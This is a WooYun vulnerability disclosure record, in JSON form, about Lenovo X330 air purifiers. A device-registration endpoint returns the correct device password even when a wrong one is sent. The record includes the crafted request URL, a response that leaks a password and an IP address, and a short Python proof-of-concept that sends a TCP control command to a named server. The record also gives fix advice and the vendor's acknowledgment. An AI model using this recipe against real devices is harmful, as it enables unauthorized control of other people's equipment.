{"id": 4080, "wybug_id": "wooyun-2015-0124795", "wybug_title": "联想X330空气净化器绕过用户绑定可任意控制他人设备漏洞", "wybug_corp": "联想", "wybug_author": "宋兵甲", "wybug_date": "2015-07-06 00:03", "wybug_open_date": "2015-08-20 12:12", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄露", "未授权访问", "智能硬件"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-20：\t细节向公众公开  简要描述： 使用错误的设备密码调用联想X330净化器的特定接口，服务器会返回正确的密码，利用这个正确的设备密码，就可以控制任意在线的X330设备。由于使用了同款APP，该漏洞同时影响到Luftmed多款净化器设备。 详细说明：  \n\nX330的设备ID没有贴在机器上，而是放在液晶显示屏里，其特别之处在于，可以通过“更新连接”按钮，导致每次生成的二维码扫描结果不一样，扫描出来的结果形如“ef23fbf000000824a221a23667400000#X33010002399MGJ4”，其中“ef23fbf000000824a221a23667400000”是用户id，“X33010001152”是设备id，“MGJ4”进过后续分析得知是设备密码，这个密码每次更新连接都会变化。但当构造类似下面的注册设备指令时：/kqjhq/user/addApparatus.do?u=ef23fbf000000824a221a23667400000&a=X33010002399GYUH&n=&t=&p=哪怕传的是错误的密码，服务器也会通过JSON把正确的密码返回过来：\n{    \"c\":1,    \"m\":\"操作成功\",    \"d\":{        \"a\":{            \"uuid\":\"dd8c19fdf1994147b5c15326fdbf3d13\",            \"ip\":\"119.139.51.157\",            \"filter\":0,            \"quality\":0,            \"carbonFilter\":0,            \"lmodify\":\"2014-11-24\",            \"uc\":\"X33010002399\",            \"n\":null,            \"o\":false,            \"t\":\"X3301000\",            \"pw\":\"72IS\"        }    }}\n设备的控制指令是通过TCP协议直接传数据实现的，拿到了设备密码，根据规则构造控制指令，就可以控制任意在线设备。   漏洞证明：  \n#!/usr/bin/env pythonimport socketTCP_IP = '121.199.51.185'TCP_PORT = 8000BUFFER_SIZE = 1024MESSAGE = \"$0AM0000T000A011X3301000239972IS00000000000000000000000000000000\\n\"s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((TCP_IP, TCP_PORT))s.send(MESSAGE)data = s.recv(BUFFER_SIZE)s.close()print \"received data:\", data\n   修复方案：  1、服务器建议不要返回正确密码，这没有任何必要。2、密码太短，只有4位，哪怕不返回，也可以很快枚举出来。   版权声明：转载请注明来源 宋兵甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-07-06 12:10 厂商回复： 非常感谢提交漏洞。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}